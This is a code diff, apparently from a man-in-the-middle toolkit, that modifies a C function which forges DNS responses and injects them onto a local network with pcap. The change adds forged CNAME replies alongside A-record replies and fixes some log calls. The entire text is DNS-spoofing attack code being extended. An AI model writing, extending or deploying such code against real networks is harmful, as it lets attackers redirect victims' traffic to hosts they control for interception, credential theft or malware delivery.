@@ -15,7 +15,7 @@
 extern PHOSTNODE gDnsSpoofingList;
 
 
-BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, char *spoofedIp, char *srcIp, char *dstIp, char *hostName)
+BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PHOSTNODE spoofingRecord, char *srcIp, char *dstIp)
 {
   BOOL retVal = FALSE;
   unsigned char *spoofedDnsResponse = NULL;
@@ -24,8 +24,18 @@ BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, char *s
   PRAW_DNS_DATA responseData = NULL;
   int counter = 0;
   char errbuf[PCAP_ERRBUF_SIZE];
+  
+  // Create DNS response data block
+  if (spoofingRecord->Data.Type == RESP_A)
+  {
+    responseData = CreateDnsResponse_A(spoofingRecord->Data.HostName, dnsBasicHdr->id, spoofingRecord->Data.SpoofedIp);
+  }
+  else if (spoofingRecord->Data.Type == RESP_CNAME)
+  {
+    responseData = CreateDnsResponse_CNAME(spoofingRecord->Data.HostName, dnsBasicHdr->id, spoofingRecord->Data.CnameHost, spoofingRecord->Data.SpoofedIp);
+  }
 
-  if ((responseData = CreateDnsResponse_A(hostName, dnsBasicHdr->id, spoofedIp)) == NULL)
+  if (responseData == NULL)
   {
     retVal = FALSE;
     goto END;
@@ -36,6 +46,7 @@ BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, char *s
     retVal = FALSE;
     goto END;
   }
+
   CopyMemory(spoofedDnsResponse, rawPacket, basePacketSize);
   CopyMemory(spoofedDnsResponse + basePacketSize, responseData->data, responseData->dataLength);
 
@@ -48,8 +59,8 @@ BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, char *s
     int funcRetVal = -2;
     if ((funcRetVal = pcap_sendpacket(deviceHandle, (unsigned char *)spoofedDnsResponse, basePacketSize + responseData->dataLength)) != 0)
     {
-      LogMsg(DBG_ERROR, "%2d Request DNS poisoning failed (%d) : %s -> %s, deviceHandle=0x%08x", 
-        counter, funcRetVal, hostName, spoofedIp, deviceHandle);
+      LogMsg(DBG_HIGH, "%2d Request DNS poisoning failed (%d) : %s -> %s, deviceHandle=0x%08x",
+        counter, funcRetVal, spoofingRecord->Data.HostName, spoofingRecord->Data.SpoofedIp, deviceHandle);
       retVal = FALSE;
     }
     else 
@@ -156,7 +167,7 @@ void FixNetworkLayerData4Request(unsigned char * data, PRAW_DNS_DATA responseDat
   ZeroMemory(dstIpStr, sizeof(dstIpStr));
   snprintf((char *)srcIpStr, sizeof(srcIpStr) - 1, "%i.%i.%i.%i", srcIpBin[0], srcIpBin[1], srcIpBin[2], srcIpBin[3]);
   snprintf((char *)dstIpStr, sizeof(dstIpStr) - 1, "%i.%i.%i.%i", dstIpBin[0], dstIpBin[1], dstIpBin[2], dstIpBin[3]);
-  LogMsg(DBG_LOW, "DnsRequestSpoofing(): %s:%d -> %s:%d udpDataLength=%d",
+  LogMsg(DBG_LOW, "FixNetworkLayerData4Request(): %s:%d -> %s:%d udpDataLength=%d",
     srcIpStr, ntohs(srcPort), dstIpStr, ntohs(dstPort), ntohs(udpHdr->ulen));
 }
 
